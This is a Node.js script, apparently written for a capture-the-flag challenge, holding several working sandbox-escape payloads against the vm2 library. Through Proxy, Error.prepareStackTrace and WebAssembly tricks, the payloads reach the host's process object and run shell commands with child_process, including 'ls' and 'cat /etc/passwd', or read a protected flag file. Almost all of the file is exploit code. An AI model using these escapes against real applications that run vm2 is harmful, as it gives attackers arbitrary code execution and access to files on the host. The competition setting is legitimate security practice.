const vm2 = require('vm2')
const fs = require("fs")
let sbx = {
    readFile: (path) => {
        if(!(new String(path).toString()).includes('flag'))
            return fs.readFileSync(path,{encoding: "utf-8"})
        return null
    },
    sum: (args) => args.reduce((a,b)=>a+b),
}

let vm = new vm2.VM({
    timeout: 20,
    sandbox: sbx,
    fixAsync: true,
    eval: false
})

let result = ":(";
let data = `const err = new Error();
err.name = {
  toString: new Proxy(() => "", {
    apply(target, thiz, args) {
      const process = args.constructor.constructor("return process")();
      throw process.mainModule.require("child_process").execSync("ls").toString();
    },
  }),
};
try {
  err.stack;
} catch (stdout) {
  stdout;
}`;
// result = new String(vm.run(`readFile("/home/ubuntu/CTF/2024/Hspace/6/for_user/src/fl"+"ag.txt")`)); 
// result = new String(vm.run(`sum([2]);const err = new Error();
// err.name = {
//   toString: new Proxy(() => "", {
//     apply(target, thiz, args) {
//       const process = args.constructor.constructor("return process")();
//       throw process.mainModule.require("child_process").execSync("echo hacked").toString();
//     },
//   }),
// };
// try {
//   err.stack;
// } catch (stdout) {
//   stdout;
// };////([]);`))

// result = new String(vm.run(`sum([2]);vm.runInNewContext(const process = this.constructor.constructor('return this.process')();
// process.mainModule.require('child_process').execSync('cat /etc/passwd').toString());////([]);`))

// result = new String(vm.run(`WebAssembly.compileStreaming({[Symbol.for('nodejs.util.inspect.custom')]:(d, o, i) => {i.constructor('return process')().mainModule.require('fs').readFileSync('/flag.txt');},valueOf:undefined,constructor:undefined}).catch(()=>{});`));
result = new String(vm.run(`Error.prepareStackTrace=(e,f)=>{f.constructor.constructor('return process')().mainModule.require('fs').readFileSync('flag.txt')};(async ()=>{})()`));
console.log(result)

// const path = "flag"
// if(!(new String(path).toString()).includes('flag'))
//   console.log(fs.readFileSync(path,{encoding: "utf-8"})); 
